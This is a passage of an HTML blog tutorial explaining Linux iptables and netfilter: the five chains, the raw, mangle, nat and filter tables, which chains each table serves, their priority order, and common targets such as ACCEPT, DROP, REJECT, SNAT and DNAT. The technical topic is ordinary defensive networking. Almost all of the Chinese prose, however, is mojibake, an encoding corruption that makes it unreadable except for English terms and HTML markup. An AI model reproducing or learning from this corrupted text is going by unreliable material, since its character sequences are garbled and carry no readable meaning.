·ï¼Œè¿™ä¸ªåŒ…è¿‡æ»¤é˜²ç«å¢™æ˜¯å…è´¹çš„ï¼Œå®ƒå¯ä»¥ä»£æ›¿æ˜‚è´µçš„å•†ä¸šé˜²ç«å¢™è§£å†³æ–¹æ¡ˆï¼Œå®Œæˆ<code>å°åŒ…è¿‡æ»¤</code>ã€<code>å°åŒ…é‡å®šå‘</code>å’Œ<code>ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰</code>ç­‰åŠŸèƒ½ã€‚</p><p>Netfilteræ˜¯Linuxæ“ä½œç³»ç»Ÿæ ¸å¿ƒå±‚å†…éƒ¨çš„ä¸€ä¸ªæ•°æ®åŒ…å¤„ç†æ¨¡å—ï¼Œå®ƒå…·æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼š</p><ul><li><p>ç½‘ç»œåœ°å€è½¬æ¢(Network Address Translate)</p></li><li><p>æ•°æ®åŒ…å†…å®¹ä¿®æ”¹</p></li><li><p>æ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™åŠŸèƒ½</p></li></ul><p>æ‰€ä»¥è¯´ï¼Œè™½ç„¶æˆ‘ä»¬ä½¿ç”¨service iptables startå¯åŠ¨iptablesâ€æœåŠ¡â€ï¼Œä½†æ˜¯å…¶å®å‡†ç¡®çš„æ¥è¯´ï¼Œiptableså¹¶<code>æ²¡æœ‰ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹</code>ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç®—æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æœåŠ¡ï¼Œè€Œåº”è¯¥ç®—æ˜¯<code>å†…æ ¸æä¾›çš„åŠŸèƒ½</code>ã€‚</p><h2 id="Iptables-åŸºç¡€"><a href="#Iptables-åŸºç¡€" class="headerlink" title="Iptables åŸºç¡€"></a>Iptables åŸºç¡€</h2><p>Iptables æ˜¯æŒ‰ç…§â€œè§„åˆ™â€åŠäº‹çš„ï¼Œè§„åˆ™å…¶å®å°±æ˜¯ç½‘ç»œç®¡ç†å‘˜é¢„å®šä¹‰çš„æ¡ä»¶ï¼Œè§„åˆ™ä¸€èˆ¬çš„å®šä¹‰ä¸º<code>&quot;å¦‚æœæ•°æ®åŒ…å¤´ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ï¼Œå°±è¿™æ ·å¤„ç†è¿™ä¸ªæ•°æ®åŒ…&quot;</code>ã€‚</p><blockquote><p>è§„åˆ™å­˜å‚¨åœ¨å†…æ ¸ç©ºé—´çš„ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­ï¼Œè¿™äº›è§„åˆ™åˆ†åˆ«æŒ‡å®šäº†æºåœ°å€ã€ç›®çš„åœ°å€ã€ä¼ è¾“åè®®ï¼ˆå¦‚TCPã€UDPã€ICMPï¼‰å’ŒæœåŠ¡ç±»å‹ï¼ˆå¦‚HTTPã€FTPå’ŒSMTPï¼‰ç­‰ã€‚å½“æ•°æ®åŒ…ä¸è§„åˆ™åŒ¹é…æ—¶ï¼Œiptableså°±æ ¹æ®è§„åˆ™æ‰€å®šä¹‰çš„æ–¹æ³•æ¥å¤„ç†è¿™äº›æ•°æ®åŒ…ï¼Œå¦‚æ”¾è¡Œï¼ˆacceptï¼‰ã€æ‹’ç»ï¼ˆrejectï¼‰å’Œä¸¢å¼ƒï¼ˆdropï¼‰ç­‰ã€‚é…ç½®é˜²ç«å¢™çš„ä¸»è¦å·¥ä½œå°±æ˜¯æ·»åŠ ã€ä¿®æ”¹å’Œåˆ é™¤è¿™äº›è§„åˆ™ã€‚</p></blockquote><p>å½“å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨çš„webæœåŠ¡æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€æŠ¥æ–‡åˆ°ç½‘å¡ï¼Œè€Œ<strong>tcp/ipåè®®æ ˆæ˜¯å±äºå†…æ ¸çš„ä¸€éƒ¨åˆ†</strong>ï¼Œæ‰€ä»¥ï¼Œå®¢æˆ·ç«¯çš„ä¿¡æ¯ä¼šé€šè¿‡å†…æ ¸çš„TCPåè®®ä¼ è¾“åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„webæœåŠ¡ä¸­ï¼Œè€Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯æŠ¥æ–‡çš„ç›®æ ‡ç»ˆç‚¹ä¸ºwebæœåŠ¡æ‰€ç›‘å¬çš„å¥—æ¥å­—ï¼ˆIPï¼šPortï¼‰ä¸Šï¼Œå½“webæœåŠ¡éœ€è¦å“åº”å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼ŒwebæœåŠ¡å‘å‡ºçš„å“åº”æŠ¥æ–‡çš„ç›®æ ‡ç»ˆç‚¹åˆ™ä¸ºå®¢æˆ·ç«¯ï¼Œè¿™ä¸ªæ—¶å€™ï¼ŒwebæœåŠ¡æ‰€ç›‘å¬çš„IPä¸ç«¯å£åè€Œå˜æˆäº†åŸç‚¹ï¼Œæˆ‘ä»¬è¯´è¿‡ï¼Œnetfilteræ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œå®ƒæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é˜²ç«å¢™èƒ½å¤Ÿè¾¾åˆ°â€é˜²ç«â€çš„ç›®çš„ï¼Œåˆ™éœ€è¦åœ¨å†…æ ¸ä¸­è®¾ç½®å…³å¡ï¼Œæ‰€æœ‰è¿›å‡ºçš„æŠ¥æ–‡éƒ½è¦é€šè¿‡è¿™äº›å…³å¡ï¼Œç»è¿‡æ£€æŸ¥åï¼Œç¬¦åˆæ”¾è¡Œæ¡ä»¶çš„æ‰èƒ½æ”¾è¡Œï¼Œç¬¦åˆé˜»æ‹¦æ¡ä»¶çš„åˆ™éœ€è¦è¢«é˜»æ­¢ï¼Œäºæ˜¯ï¼Œå°±å‡ºç°äº†inputå…³å¡å’Œoutputå…³å¡ï¼Œ<strong>è€Œè¿™äº›å…³å¡åœ¨iptablesä¸­ä¸è¢«ç§°ä¸ºâ€å…³å¡â€,è€Œè¢«ç§°ä¸ºâ€é“¾â€ã€‚</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_1.png"></p><p>ä¸Šé¢æè¿°çš„åœºæ™¯å¹¶ä¸å®Œå–„ï¼Œå› ä¸º<strong>å®¢æˆ·ç«¯å‘æ¥çš„æŠ¥æ–‡è®¿é—®çš„ç›®æ ‡åœ°å€å¯èƒ½å¹¶ä¸æ˜¯æœ¬æœºï¼Œè€Œæ˜¯å…¶ä»–æœåŠ¡å™¨ï¼Œå½“æœ¬æœºçš„å†…æ ¸æ”¯æŒIP_FORWARDæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŠ¥æ–‡è½¬å‘ç»™å…¶ä»–æœåŠ¡å™¨</strong>ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šæåˆ°iptablesä¸­çš„å…¶ä»–â€å…³å¡â€ï¼Œä¹Ÿå°±æ˜¯å…¶ä»–â€é“¾â€ï¼Œä»–ä»¬å°±æ˜¯  â€œè·¯ç”±å‰â€ã€â€è½¬å‘â€ã€â€è·¯ç”±åâ€ï¼Œä»–ä»¬çš„è‹±æ–‡åæ˜¯</p><p>PREROUTINGã€FORWARDã€POSTROUTING</p><p>æ ¹æ®å®é™…æƒ…å†µçš„ä¸åŒï¼ŒæŠ¥æ–‡ç»è¿‡â€é“¾â€å¯èƒ½ä¸åŒã€‚<strong>å¦‚æœæŠ¥æ–‡éœ€è¦è½¬å‘ï¼Œé‚£ä¹ˆæŠ¥æ–‡åˆ™ä¸ä¼šç»è¿‡inputé“¾å‘å¾€ç”¨æˆ·ç©ºé—´ï¼Œè€Œæ˜¯ç›´æ¥åœ¨å†…æ ¸ç©ºé—´ä¸­ç»è¿‡forwardé“¾å’Œpostroutingé“¾è½¬å‘å‡ºå»çš„ã€‚</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png"></p><p>å¸¸è§åœºæ™¯ä¸­æŠ¥æ–‡çš„æµå‘ï¼š</p><ul><li><p>åˆ°æœ¬æœºæŸè¿›ç¨‹çš„æŠ¥æ–‡ï¼šPREROUTING â€“&gt; INPUT</p></li><li><p>ç”±æœ¬æœºè½¬å‘çš„æŠ¥æ–‡ï¼šPREROUTING â€“&gt; FORWARD â€“&gt; POSTROUTING</p></li><li><p>ç”±æœ¬æœºçš„æŸè¿›ç¨‹å‘å‡ºæŠ¥æ–‡ï¼ˆé€šå¸¸ä¸ºå“åº”æŠ¥æ–‡ï¼‰ï¼šOUTPUT â€“&gt; POSTROUTING</p></li></ul><h2 id="é“¾çš„æ¦‚å¿µ"><a href="#é“¾çš„æ¦‚å¿µ" class="headerlink" title="é“¾çš„æ¦‚å¿µ"></a>é“¾çš„æ¦‚å¿µ</h2><p>ä¸ºä»€ä¹ˆâ€œå…³å¡â€ åœ¨ iptables ä¸­è¢«ç§°åšâ€œé“¾ï¼š</p><p>é˜²ç«å¢™çš„ä½œç”¨å°±åœ¨äºå¯¹ç»è¿‡æŠ¥æ–‡åŒ¹é…â€œè§„åˆ™â€ï¼Œç„¶åæ‰§è¡Œç›¸å¯¹åº”çš„â€œåŠ¨ä½œâ€ã€‚ç„¶è€Œå…³å¡ä¸Šä¸åªåªæœ‰ä¸€æ¡è§„åˆ™ï¼Œè€Œä¸”æœ‰å¾ˆå¤šæ¡è§„åˆ™ï¼Œå½“æˆ‘ä»¬æŠŠè¿™äº›è§„åˆ™ä¸²åˆ°ä¸€ä¸ªé“¾æ¡ä¸Šçš„æ—¶å€™ï¼Œå°±å½¢æˆäº†â€é“¾â€ã€‚</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_3.png"></p><p>æ¯ä¸ªç»è¿‡è¿™ä¸ªâ€å…³å¡â€çš„æŠ¥æ–‡ï¼Œéƒ½è¦å°†è¿™æ¡â€é“¾â€ä¸Šçš„æ‰€æœ‰è§„åˆ™åŒ¹é…ä¸€éï¼Œå¦‚æœæœ‰ç¬¦åˆæ¡ä»¶çš„è§„åˆ™ï¼Œåˆ™æ‰§è¡Œè§„åˆ™å¯¹åº”çš„åŠ¨ä½œã€‚</p><h2 id="è¡¨çš„æ¦‚å¿µ"><a href="#è¡¨çš„æ¦‚å¿µ" class="headerlink" title="è¡¨çš„æ¦‚å¿µ"></a>è¡¨çš„æ¦‚å¿µ</h2><blockquote><p>æˆ‘ä»¬å†æƒ³æƒ³å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯¹æ¯ä¸ªâ€é“¾â€ä¸Šéƒ½æ”¾ç½®äº†ä¸€ä¸²è§„åˆ™ï¼Œä½†æ˜¯è¿™äº›è§„åˆ™æœ‰äº›å¾ˆç›¸ä¼¼ï¼Œæ¯”å¦‚ï¼ŒAç±»è§„åˆ™éƒ½æ˜¯å¯¹IPæˆ–è€…ç«¯å£çš„è¿‡æ»¤ï¼ŒBç±»è§„åˆ™æ˜¯ä¿®æ”¹æŠ¥æ–‡ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½<strong>æŠŠå®ç°ç›¸åŒåŠŸèƒ½çš„è§„åˆ™æ”¾åœ¨ä¸€èµ·</strong>å‘¢ï¼Œå¿…é¡»èƒ½çš„ã€‚</p></blockquote><p>æŠŠå…·æœ‰ç›¸åŒåŠŸèƒ½çš„è§„åˆ™çš„é›†åˆå«åšâ€è¡¨â€ï¼Œæ‰€ä»¥è¯´ï¼Œä¸åŒåŠŸèƒ½çš„è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾ç½®åœ¨ä¸åŒçš„è¡¨ä¸­è¿›è¡Œç®¡ç†ï¼Œè€Œiptableså·²ç»ä¸ºæˆ‘ä»¬å®šä¹‰äº†4ç§è¡¨ï¼Œæ¯ç§è¡¨å¯¹åº”äº†ä¸åŒçš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬å®šä¹‰çš„è§„åˆ™ä¹Ÿéƒ½é€ƒè„±ä¸äº†è¿™4ç§åŠŸèƒ½çš„èŒƒå›´ï¼Œæ‰€ä»¥ï¼Œå­¦ä¹ iptablesä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆææ˜ç™½æ¯ç§è¡¨ çš„ä½œç”¨ã€‚</p><p>iptablesä¸ºæˆ‘ä»¬æä¾›äº†å¦‚ä¸‹è§„åˆ™çš„åˆ†ç±»ï¼Œæˆ–è€…è¯´ï¼Œiptablesä¸ºæˆ‘ä»¬æä¾›äº†å¦‚ä¸‹â€è¡¨â€</p><ul><li><p>filterè¡¨ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œé˜²ç«å¢™ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter</p></li><li><p>natè¡¨ï¼šnetwork address translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptable_nat</p></li><li><p>mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£… çš„åŠŸèƒ½ï¼›iptable_mangle</p></li><li><p>rawè¡¨ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼›iptable_raw</p></li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„æ‰€æœ‰è§„åˆ™ï¼Œéƒ½æ˜¯è¿™å››ç§åˆ†ç±»ä¸­çš„è§„åˆ™ï¼Œæˆ–è€…è¯´ï¼Œæ‰€æœ‰è§„åˆ™éƒ½å­˜åœ¨äºè¿™4å¼ â€è¡¨â€ä¸­ã€‚</p><p></p><h2 id="è¡¨é“¾å…³ç³»"><a href="#è¡¨é“¾å…³ç³»" class="headerlink" title="è¡¨é“¾å…³ç³»"></a>è¡¨é“¾å…³ç³»</h2><blockquote><p>æŸäº›â€œé“¾â€ä¸­æ³¨å®šä¸ä¼šåŒ…å«â€œæŸç±»è§„åˆ™â€ã€‚</p></blockquote><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_4.png" alt="preroutingé“¾ä¸Šçš„è§„åˆ™å­˜åœ¨çš„è¡¨æƒ…å†µ"></p><blockquote><p>preroutingâ€é“¾â€åªæ‹¥æœ‰natè¡¨ã€rawè¡¨å’Œmangleè¡¨æ‰€å¯¹åº”çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ï¼Œpreroutingä¸­çš„è§„åˆ™åªèƒ½å­˜æ”¾äºnatè¡¨ã€rawè¡¨å’Œmangleè¡¨ä¸­</p></blockquote><p>PREROUTING    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p>INPUT      çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ï¼Œï¼ˆcentos7ä¸­è¿˜æœ‰natè¡¨ï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰ã€‚</p><p>FORWARD     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ã€‚</p><p>OUTPUT     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨mangleè¡¨ï¼Œnatè¡¨ï¼Œfilterè¡¨ã€‚</p><p>POSTROUTING    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p><strong>åœ¨å®é™…çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€æ˜¯é€šè¿‡â€è¡¨â€ä½œä¸ºæ“ä½œå…¥å£ï¼Œå¯¹è§„åˆ™è¿›è¡Œå®šä¹‰çš„</strong>ï¼Œä¹‹æ‰€ä»¥æŒ‰ç…§ä¸Šè¿°è¿‡ç¨‹ä»‹ç»iptablesï¼Œæ˜¯å› ä¸ºä»â€å…³å¡â€çš„è§’åº¦æ›´å®¹æ˜“ä»å…¥é—¨çš„è§’åº¦ç†è§£ï¼Œä½†æ˜¯ä¸ºäº†ä»¥ä¾¿åœ¨å®é™…ä½¿ç”¨çš„æ—¶å€™ï¼Œæ›´åŠ é¡ºç•…çš„ç†è§£å®ƒä»¬ï¼Œæ­¤å¤„æˆ‘ä»¬è¿˜è¦å°†å„â€è¡¨â€ä¸â€é“¾â€çš„å…³ç³»ç½—åˆ—å‡ºæ¥ï¼Œ</p><p>è¡¨ï¼ˆåŠŸèƒ½ï¼‰&lt;â€“&gt;  é“¾ï¼ˆé’©å­ï¼‰ï¼š</p><p>raw   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUT</p><p>mangle  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒINPUTï¼ŒFORWARDï¼ŒOUTPUTï¼ŒPOSTROUTING</p><p>nat   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUTï¼ŒPOSTROUTINGï¼ˆcentos7ä¸­è¿˜æœ‰INPUTï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰</p><p>filter  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šINPUTï¼ŒFORWARDï¼ŒOUTPUT</p><hr><p>å…¶å®æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œå› ä¸ºæ•°æ®åŒ…ç»è¿‡ä¸€ä¸ªâ€é“¾â€çš„æ—¶å€™ï¼Œä¼šå°†å½“å‰é“¾çš„æ‰€æœ‰è§„åˆ™éƒ½åŒ¹é…ä¸€éï¼Œä½†æ˜¯åŒ¹é…æ—¶æ€»å½’è¦æœ‰é¡ºåºï¼Œæˆ‘ä»¬åº”è¯¥ä¸€æ¡ä¸€æ¡çš„å»åŒ¹é…ï¼Œè€Œä¸”æˆ‘ä»¬è¯´è¿‡ï¼Œç›¸åŒåŠŸèƒ½ç±»å‹çš„è§„åˆ™ä¼šæ±‡èšåœ¨ä¸€å¼ â€è¡¨â€ä¸­ï¼Œé‚£ä¹ˆï¼Œå“ªäº›â€è¡¨â€ä¸­çš„è§„åˆ™ä¼šæ”¾åœ¨â€é“¾â€çš„æœ€å‰é¢æ‰§è¡Œå‘¢ï¼Œè¿™æ—¶å€™å°±éœ€è¦æœ‰ä¸€ä¸ªä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜æ‹¿preroutingâ€é“¾â€åšå›¾ç¤ºã€‚<br><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_5.png"></p><p>preroutingé“¾ä¸­çš„è§„åˆ™å­˜æ”¾äºä¸‰å¼ è¡¨ä¸­ï¼Œè€Œè¿™ä¸‰å¼ è¡¨ä¸­çš„è§„åˆ™æ‰§è¡Œçš„ä¼˜å…ˆçº§å¦‚ä¸‹ï¼š</p><p>raw â€“&gt; mangle â€“&gt; nat</p><p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œ<strong>iptablesä¸ºæˆ‘ä»¬å®šä¹‰äº†4å¼ â€è¡¨â€,å½“ä»–ä»¬å¤„äºåŒä¸€æ¡â€é“¾â€æ—¶ï¼Œæ‰§è¡Œçš„ä¼˜å…ˆçº§å¦‚ä¸‹ã€‚</strong></p><p>ä¼˜å…ˆçº§æ¬¡åºï¼ˆç”±é«˜è€Œä½ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw --&gt; mangle --&gt; nat --&gt; filter</span><br></pre></td></tr></table></figure><p>å‰é¢è¯´è¿‡ï¼ŒæŸäº›é“¾å¤©ç”Ÿå°±ä¸èƒ½ä½¿ç”¨æŸäº›è¡¨ä¸­çš„è§„åˆ™ï¼Œæ‰€ä»¥ï¼Œ<strong>4å¼ è¡¨ä¸­çš„è§„åˆ™å¤„äºåŒä¸€æ¡é“¾çš„ç›®å‰åªæœ‰outputé“¾</strong>ï¼Œå®ƒå°±æ˜¯ä¼ è¯´ä¸­æµ·é™†ç©ºéƒ½èƒ½é˜²å®ˆçš„å…³å¡ã€‚</p><h2 id="æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹"><a href="#æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹" class="headerlink" title="æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹"></a>æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹</h2><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png"></p><p>æˆ‘ä»¬å°†ç»å¸¸ç”¨åˆ°çš„å¯¹åº”å…³ç³»é‡æ–°å†™åœ¨æ­¤å¤„ï¼Œæ–¹ä¾¿å¯¹åº”å›¾ä¾‹æŸ¥çœ‹ã€‚</p><p>é“¾çš„è§„åˆ™å­˜æ”¾äºå“ªäº›è¡¨ä¸­ï¼ˆä»é“¾åˆ°è¡¨çš„å¯¹åº”å…³ç³»ï¼‰ï¼š</p><p>PREROUTING  çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p>INPUT     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ï¼Œï¼ˆcentos7ä¸­è¿˜æœ‰natè¡¨ï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰ã€‚</p><p>FORWARD    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ã€‚</p><p>OUTPUT    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨mangleè¡¨ï¼Œnatè¡¨ï¼Œfilterè¡¨ã€‚</p><p>POSTROUTING  çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œnatè¡¨ã€‚</p><hr><p>è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼ˆä»è¡¨åˆ°é“¾çš„å¯¹åº”å…³ç³»ï¼‰ï¼š</p><p>raw   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUT</p><p>mangle  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒINPUTï¼ŒFORWARDï¼ŒOUTPUTï¼ŒPOSTROUTING</p><p>nat   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUTï¼ŒPOSTROUTINGï¼ˆcentos7ä¸­è¿˜æœ‰INPUTï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰</p><p>filter  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šINPUTï¼ŒFORWARDï¼ŒOUTPUT</p><p>ä¸‹å›¾ä¸­natè¡¨åœ¨centos7ä¸­çš„æƒ…å†µå°±ä¸å†æ ‡æ˜ã€‚</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_7.png"></p><h2 id="è§„åˆ™çš„æ¦‚å¿µ"><a href="#è§„åˆ™çš„æ¦‚å¿µ" class="headerlink" title="è§„åˆ™çš„æ¦‚å¿µ"></a>è§„åˆ™çš„æ¦‚å¿µ</h2><p>è§„åˆ™ï¼šæ ¹æ®æŒ‡å®šçš„åŒ¹é…æ¡ä»¶æ¥å°è¯•åŒ¹é…æ¯ä¸ªæµç»æ­¤å¤„çš„æŠ¥æ–‡ï¼Œä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œåˆ™ç”±è§„åˆ™åé¢æŒ‡å®šçš„å¤„ç†åŠ¨ä½œè¿›è¡Œå¤„ç†</p><p>è§„åˆ™ç”±åŒ¹é…æ¡ä»¶å’Œå¤„ç†åŠ¨ä½œç»„æˆã€‚</p><ul><li>åŒ¹é…æ¡ä»¶</li></ul><p>åŒ¹é…æ¡ä»¶åˆ†ä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ä¸æ‰©å±•åŒ¹é…æ¡ä»¶</p><p><strong>åŸºæœ¬åŒ¹é…æ¡ä»¶ï¼š</strong></p><p>æºåœ°å€Source IPï¼Œç›®æ ‡åœ°å€ Destination IP</p><p>ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ã€‚</p><p><strong>æ‰©å±•åŒ¹é…æ¡ä»¶ï¼š</strong></p><p>é™¤äº†ä¸Šè¿°çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿™äº›æ¡ä»¶æ³›ç§°ä¸ºæ‰©å±•æ¡ä»¶ï¼Œè¿™äº›æ‰©å±•æ¡ä»¶å…¶å®ä¹Ÿæ˜¯netfilterä¸­çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯ä»¥æ¨¡å—çš„å½¢å¼å­˜åœ¨ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨è¿™äº›æ¡ä»¶ï¼Œåˆ™éœ€è¦ä¾èµ–å¯¹åº”çš„æ‰©å±•æ¨¡å—ã€‚</p><p>æºç«¯å£Source Port, ç›®æ ‡ç«¯å£Destination Port</p><p>ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºæ‰©å±•åŒ¹é…æ¡ä»¶</p><ul><li>å¤„ç†åŠ¨ä½œ</li></ul><p>å¤„ç†åŠ¨ä½œåœ¨iptablesä¸­è¢«ç§°ä¸ºtargetï¼ˆè¿™æ ·è¯´å¹¶ä¸å‡†ç¡®ï¼Œæˆ‘ä»¬æš‚ä¸”è¿™æ ·ç§°å‘¼ï¼‰ï¼ŒåŠ¨ä½œä¹Ÿå¯ä»¥åˆ†ä¸ºåŸºæœ¬åŠ¨ä½œå’Œæ‰©å±•åŠ¨ä½œã€‚</p><p>æ­¤å¤„åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„åŠ¨ä½œï¼Œä¹‹åçš„æ–‡ç« ä¼šå¯¹å®ƒä»¬è¿›è¡Œè¯¦ç»†çš„ç¤ºä¾‹ä¸æ€»ç»“ï¼š</p><p><strong>ACCEPT</strong>ï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚</p><p><strong>DROP</strong>ï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚</p><p><strong>REJECT</strong>ï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚</p><p><strong>SNAT</strong>ï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚</p><p><strong>MASQUERADE</strong>ï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Šã€‚</p><p><strong>DNAT</strong>ï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚</p><p><strong>REDIRECT</strong>ï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚</p><p><strong>LOG</strong>ï¼šåœ¨/var/log/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚</p><h1 id="iptables-å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢"><a href="#iptables-å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢" class="headerlink" title="iptables 